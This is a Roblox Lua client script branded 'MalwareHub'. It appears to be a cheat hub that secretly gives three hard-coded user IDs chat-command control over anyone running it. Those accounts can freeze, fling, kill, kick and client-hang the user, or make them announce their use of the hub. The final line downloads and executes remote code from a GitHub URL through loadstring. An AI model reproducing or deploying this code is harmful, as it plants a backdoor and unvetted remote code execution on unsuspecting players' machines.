local PremUser = {
    3861815968, -- iiTheCaliXx
    3743834922, -- LaBeastHk
    2549855342, -- svoirr
}

local player = game.Players.LocalPlayer
local Players = game.Players

local function commands(msg, plr)
    if not table.find(PremUser, plr) then return end

    local Mod = game:GetService('Players'):GetPlayerByUserId(plr)
    local Msg = string.lower(msg)
    local SplitCMD = string.split(Msg, ' ')
    local Lower = string.lower(player.Name)
    local Allowed = string.find(Lower, SplitCMD[2])

    if Allowed then
        if string.find(SplitCMD[1], 'm!freeze') then
            player.Character.HumanoidRootPart.Anchored = true
        elseif string.find(SplitCMD[1], 'm!unfreeze') or string.find(SplitCMD[1], 'm!nofreeze') then
            player.Character.HumanoidRootPart.Anchored = false
        elseif string.find(SplitCMD[1], 'm!kick') then
            local ISADMIN = table.find(PremUser, player.UserId)
            if not ISADMIN then
                player:Kick("\n[MALWARE HUB]\nKicked by: " .. Mod.Name .. "\n[If you think the command was misused, you can report it to the Discord server.]")
                wait(5)
                while true do end
            end
        elseif string.find(SplitCMD[1], 'm!bring') then
            local targetPlayer = Players:FindFirstChild(SplitCMD[2])
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            end
        elseif string.find(SplitCMD[1], 'm!fling') then
            player.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
        elseif string.find(SplitCMD[1], 'm!kill') then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid:Destroy()
            end
        elseif string.find(SplitCMD[1], 'm!sit') then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Sit = true
            end
        elseif string.find(SplitCMD[1], 'm!bug') then
            player:Destroy()
        elseif string.find(SplitCMD[1], 'm!checkuser') then
            local ISADMIN = table.find(PremUser, player.UserId)
            if not ISADMIN then
                local args = {[1] = "/w " .. Mod.Name .. " I'm using MalwareHub", [2] = "All"}
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
            end
        end
    else
        if string.find(msg, 'm!check cmds') or string.find(msg, 'm!check commands') then
            print("\n---...MalwareHub PREM Commands...---")
            print("\nm!check cmds / m!check commands\nm!check users\nm!checkuser [user]\nm!bring [user]\nm!bug [user]\nm!fling [user]\nm!freeze [user]\nm!unfreeze [user] / m!nofreeze [user]\nm!kick [user]\nm!kill [user]\nm!sit [user]")
            print("\n --..--..--..--..--..--..--..--..-- ")
        end
        if string.find(msg, 'm!check users') then
            local ISADMIN = table.find(PremUser, player.UserId)
            if not ISADMIN then
                local args = {[1] = "/w " .. Mod.Name .. " I'm using MalwareHub", [2] = "All"}
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
            end
        end
    end
end

local muted = {}
local mutingnew = false

Players.PlayerAdded:Connect(function(plr)
    local PREMS = table.find(PremUser, plr.UserId)
    if PREMS then
        plr.CharacterAdded:Connect(function()
            local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                if plr.Name ~= "iiTheCaliXx" and plr.Name ~= "LaBeastHk" then
                    humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
                else
                    humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
                end
            end
        end)
    end
    if mutingnew == true then
        if not table.find(muted, plr.Name) then
            table.insert(muted, plr.Name)
            print('automuted ' .. plr.Name)
        end
    end
end)

for i, v in pairs(game:GetService('Players'):GetChildren()) do
    local PREMS = table.find(PremUser, v.UserId)
    if PREMS then
        wait(5)
        local humanoid = v.Character and v.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            if v.Name ~= "7iloooo" and v.Name ~= "amk7loh7" then
                humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
                v.CharacterAdded:Connect(function()
                    local humanoid = v.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.DisplayName = "[Admin] " .. humanoid.DisplayName
                    end
                end)
            else
                humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
                v.CharacterAdded:Connect(function()
                    local humanoid = v.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        humanoid.DisplayName = "[Owner] " .. humanoid.DisplayName
                    end
                end)
            end
        end
    end
end

local chatevent = game.ReplicatedStorage.DefaultChatSystemChatEvents
chatevent.OnMessageDoneFiltering.OnClientEvent:Connect(function(Table)
    local plr = game.Players[Table.FromSpeaker]
    local msg = Table.Message
    local PREMS = table.find(PremUser, plr.UserId)
    if PREMS then
        commands(msg, plr.UserId)
    end
end)

-- Load and execute external script
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
